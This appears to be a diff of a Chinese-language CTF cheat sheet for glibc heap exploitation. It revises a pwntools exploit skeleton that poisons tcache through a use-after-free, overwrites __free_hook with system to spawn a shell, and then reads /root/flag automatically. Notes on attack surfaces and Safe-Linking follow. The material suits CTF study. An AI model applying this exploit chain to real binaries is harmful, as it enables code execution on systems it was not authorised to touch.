@@ -14,6 +14,7 @@ from pwn import *
 context.arch = 'amd64'
 elf = ELF('./your_binary')
 libc = ELF('./libc.so.6')
+p = process('./your_binary')
 
 # --- 漏洞利用函数 (示例) ---
 def add(size, data):
@@ -21,6 +22,8 @@ def add(size, data):
 def delete(index):
     # ...
 def edit(index, data): # UAF 的入口
+    # ...
+def show(index):
     # ...
 
 # --- 漏洞利用 ---
@@ -49,16 +52,18 @@ add(0x30, b'dummy') # 分配出原始的 chunk 0
 log.info(f"Overwriting __free_hook with system...")
 add(0x30, p64(system)) # 这次 add 返回的是 __free_hook 的地址
 
-# 5. 获取 Shell
+# 5. 获取 Shell 并自动读取 flag
 log.info("Triggering shell...")
 add(0x20, b'/bin/sh\x00') # chunk 4
 delete(4) # free("/bin/sh") -> system("/bin/sh")
 
-io.interactive()
+# 自动化获取 flag
+p.sendline(b'cat /root/flag')
+flag = p.recvline(timeout=2).decode().strip()
+log.success(f"Flag: {flag}")
 ```
 
 # 攻击关键点速查
-
 - **重要钩子 (Key Hooks)**
   - **`fd` (next) 指针**: 位于 tcache 空闲 chunk 的起始位置，是投毒的核心目标。覆盖它就等于污染了 tcache 链表。
   - **`__free_hook`**: 经典的 RCE 终点。将其覆盖为 `system` 地址，再 `free` 一个内容为 `"/bin/sh"` 的 chunk 即可拿 Shell。
@@ -73,10 +78,8 @@ io.interactive()
 - **主要攻击面 (Main Attack Surfaces)**
   - **Use-After-Free (UAF)**: 允许在 `free` 后继续 `edit` 一个 chunk，是修改 `fd` 指针最直接的方式。
   - **堆溢出**: 通过溢出前一个 chunk，覆盖到紧邻的、已 `free` 的 tcache chunk 的 `fd` 指针。
-  - **Double Free**: 在 tcache 中，连续 `free` 同一个 chunk 两次（glibc 2.26）或 `free(A); free(B); free(A)`（更高版本）可以形成循环链表，这也是一种强大的任意地址分配原语。
 
 # 迭代扩展思路
-
 - **从骨架到稳定 EXP 的演进**
   1.  **适配 Safe-Linking (glibc >= 2.32)**:
       -   **原理**: `fd` 指针被加密为 `(L >> 12) ^ P`，其中 `P` 是 chunk 地址，`L` 是 `fd` 明文。
